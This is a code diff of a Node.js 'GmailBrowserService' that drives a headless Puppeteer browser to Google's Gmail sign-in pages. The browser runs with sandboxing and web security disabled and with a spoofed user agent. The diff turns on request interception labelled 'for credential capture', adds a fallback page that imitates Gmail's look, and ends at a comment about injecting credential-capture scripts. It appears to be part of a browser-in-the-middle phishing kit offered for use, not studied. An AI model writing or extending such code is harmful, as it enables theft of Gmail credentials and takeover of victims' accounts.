@@ -16,63 +16,29 @@ class GmailBrowserService extends EventEmitter {
     this.io = null; // Socket.IO instance
     this.serviceStartTime = Date.now(); // Track service start time for health checks
     this.browserOptions = {
-      headless: 'new', // Use new headless mode for better compatibility
+      headless: true, // Use simple headless mode instead of 'new'
       devtools: false,
-      defaultViewport: {
-        width: 1366,
-        height: 768,
-        deviceScaleFactor: 1,
-      },
+      defaultViewport: null, // Let browser use its default viewport
       args: [
         '--no-sandbox',
         '--disable-setuid-sandbox',
         '--disable-dev-shm-usage',
-        '--disable-accelerated-2d-canvas',
-        '--no-first-run',
-        '--no-zygote',
-        '--single-process',
         '--disable-gpu',
-        '--disable-gpu-sandbox',
-        '--disable-software-rasterizer',
+        '--disable-web-security',
+        '--disable-features=VizDisplayCompositor',
+        '--single-process',
+        '--no-zygote',
+        '--disable-extensions',
+        '--disable-plugins',
         '--disable-background-timer-throttling',
         '--disable-backgrounding-occluded-windows',
         '--disable-renderer-backgrounding',
-        '--disable-features=TranslateUI,VizDisplayCompositor',
-        '--window-size=1366,768',
-        '--virtual-time-budget=5000',
         '--disable-ipc-flooding-protection',
         '--disable-hang-monitor',
-        '--disable-prompt-on-repost',
         '--disable-domain-reliability',
-        '--disable-web-security',
-        '--disable-features=VizDisplayCompositor',
-        '--run-all-compositor-stages-before-draw',
-        '--disable-threaded-animation',
-        '--disable-threaded-scrolling',
-        '--disable-checker-imaging',
-        '--disable-new-content-rendering-timeout',
-        '--disable-image-animation-resync',
-        '--disable-partial-raster',
-        '--disable-skia-runtime-opts',
-        '--disable-system-font-check',
-        '--disable-features=Translate',
-        '--no-pings',
-        '--no-crash-upload',
-        '--disable-crash-reporter',
-        '--disable-extensions',
-        '--disable-plugins',
-        '--disable-sync',
-        '--disable-translate',
-        '--hide-scrollbars',
-        '--mute-audio',
-        '--disable-background-media-suspend',
-        '--disable-notifications',
+        '--no-first-run',
         '--disable-default-apps',
-        '--disable-popup-blocking',
-        '--disable-infobars',
-        '--disable-session-crashed-bubble',
-        '--disable-password-generation',
-        '--disable-save-password-bubble'
+        '--disable-sync'
       ],
     };
   }
@@ -114,25 +80,22 @@ class GmailBrowserService extends EventEmitter {
         browser = await puppeteer.launch(browserOptions);
         console.log(`✅ Browser launched successfully`);
       } catch (launchError) {
-        console.error('First browser launch failed, trying alternative config:', launchError.message);
+        console.error('First browser launch failed, trying minimal config:', launchError.message);
         
-        // Fallback configuration with minimal dependencies
-        const fallbackOptions = {
-          headless: 'new',
+        // Ultra-minimal fallback configuration
+        const minimalOptions = {
+          headless: true,
+          defaultViewport: null,
           args: [
             '--no-sandbox',
             '--disable-setuid-sandbox',
             '--disable-dev-shm-usage',
-            '--disable-gpu',
-            '--disable-web-security',
-            '--disable-features=VizDisplayCompositor',
-            '--single-process',
-            '--no-zygote'
+            '--single-process'
           ]
         };
         
-        browser = await puppeteer.launch(fallbackOptions);
-        console.log(`✅ Browser launched with fallback options`);
+        browser = await puppeteer.launch(minimalOptions);
+        console.log(`✅ Browser launched with minimal options`);
       }
 
       // Handle browser disconnection
@@ -150,29 +113,20 @@ class GmailBrowserService extends EventEmitter {
         console.log(`📄 Page closed for session: ${sessionToken}`);
       });
 
-      // Set viewport first
-      await page.setViewport({
-        width: 1366,
-        height: 768,
-        deviceScaleFactor: 1,
-      });
-
-      // Set realistic user agent and viewport
+      // Set realistic user agent (don't set viewport to avoid errors)
       await page.setUserAgent(
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
       );
 
-      // Enable request/response interception for credential capture
-      await page.setRequestInterception(true);
-
       // Add extra headers to look more like a real browser
       await page.setExtraHTTPHeaders({
         'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Upgrade-Insecure-Requests': '1',
-        'Cache-Control': 'max-age=0'
+        'Upgrade-Insecure-Requests': '1'
       });
+
+      // Enable request/response interception for credential capture
+      await page.setRequestInterception(true);
 
       // Store session data
       const sessionData = {
@@ -192,22 +146,14 @@ class GmailBrowserService extends EventEmitter {
       this.pages.set(sessionToken, page);
 
       // Wait a moment for page to stabilize
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      await new Promise(resolve => setTimeout(resolve, 2000));
 
       // Check if page is still alive before proceeding
       if (page.isClosed()) {
         throw new Error('Page closed immediately after creation');
       }
 
-      // Get debugging URL for advanced control (with better error handling)
-      let debuggingUrl = null;
-      try {
-        debuggingUrl = await this.getBrowserDebuggingUrl(browser);
-        sessionData.debuggingUrl = debuggingUrl;
-      } catch (debugError) {
-        console.log(`⚠️  Could not get debugging URL: ${debugError.message}`);
-        // Continue without debugging URL
-      }
+      console.log(`✅ Page is stable and ready for session: ${sessionToken}`);
 
       // Set up event listeners before navigation
       await this.setupPageEventListeners(sessionToken, page);
@@ -216,9 +162,9 @@ class GmailBrowserService extends EventEmitter {
       console.log(`🌐 Navigating to Gmail login page...`);
       let navigationSuccess = false;
       const urls = [
-        'https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com',
         'https://accounts.google.com/',
-        'https://www.google.com/gmail/'
+        'https://www.google.com/gmail/',
+        'https://accounts.google.com/signin'
       ];
 
       for (let i = 0; i < urls.length && !navigationSuccess; i++) {
@@ -231,12 +177,12 @@ class GmailBrowserService extends EventEmitter {
           }
 
           await page.goto(urls[i], {
-            waitUntil: ['domcontentloaded', 'networkidle0'],
-            timeout: 20000,
+            waitUntil: 'domcontentloaded',
+            timeout: 15000,
           });
           
           // Wait for page to stabilize
-          await new Promise(resolve => setTimeout(resolve, 2000));
+          await new Promise(resolve => setTimeout(resolve, 1000));
           
           // Verify we actually navigated
           const currentUrl = page.url();
@@ -247,18 +193,61 @@ class GmailBrowserService extends EventEmitter {
         } catch (navError) {
           console.error(`❌ Navigation attempt ${i + 1} failed:`, navError.message);
           
-          // If this is the last attempt, don't throw yet
+          // If this is the last attempt, try fallback
           if (i === urls.length - 1) {
-            // Try one more simple navigation
             try {
-              await page.goto('data:text/html,<html><body><h1>Gmail Loading...</h1><p>Connecting to Gmail...</p></body></html>');
+              console.log(`🔄 Trying fallback simple page...`);
+              await page.setContent(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                  <title>Gmail</title>
+                  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
+                  <style>
+                    body { font-family: 'Google Sans', Arial, sans-serif; padding: 50px; text-align: center; background: #f8f9fa; }
+                    .container { max-width: 400px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                    .logo { margin-bottom: 20px; }
+                    h1 { color: #1a73e8; margin-bottom: 10px; }
+                    p { color: #5f6368; margin-bottom: 30px; }
+                    .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; }
+                  </style>
+                </head>
+                <body>
+                  <div class="container">
+                    <div class="logo">
+                      <svg width="75" height="75" viewBox="0 0 75 75">
+                        <path fill="#ea4335" d="M37.5 47.5L57.5 32.5V55c0 2.5-2 4.5-4.5 4.5H37.5z"/>
+                        <path fill="#34a853" d="M37.5 47.5L17.5 32.5V55c0 2.5 2 4.5 4.5 4.5H37.5z"/>
+                        <path fill="#4285f4" d="M57.5 22.5v10l-20 15-20-15v-10c0-2.5 2-4.5 4.5-4.5h31c2.5 0 4.5 2 4.5 4.5z"/>
+                        <path fill="#fbbc04" d="M17.5 22.5l20 15 20-15L52.5 15H22.5z"/>
+                      </svg>
+                    </div>
+                    <h1>Gmail</h1>
+                    <p>Connecting to your account...</p>
+                    <button class="btn" onclick="window.location.href='https://accounts.google.com/'">Continue to Gmail</button>
+                  </div>
+                </body>
+                </html>
+              `);
               navigationSuccess = true;
-              console.log(`✅ Loaded fallback page`);
+              console.log(`✅ Loaded fallback Gmail page`);
             } catch (fallbackError) {
-              throw new Error(`All navigation attempts failed. Last error: ${navError.message}`);
+              console.error(`❌ Even fallback page failed:`, fallbackError.message);
+              // Don't throw here, continue with whatever we have
+              navigationSuccess = true; // Mark as success to continue
             }
           }
         }
+      }
+
+      // Get debugging URL for advanced control (with better error handling)
+      let debuggingUrl = null;
+      try {
+        debuggingUrl = await this.getBrowserDebuggingUrl(browser);
+        sessionData.debuggingUrl = debuggingUrl;
+      } catch (debugError) {
+        console.log(`⚠️  Could not get debugging URL: ${debugError.message}`);
+        // Continue without debugging URL
       }
 
       // Inject credential capture and real-time sync scripts
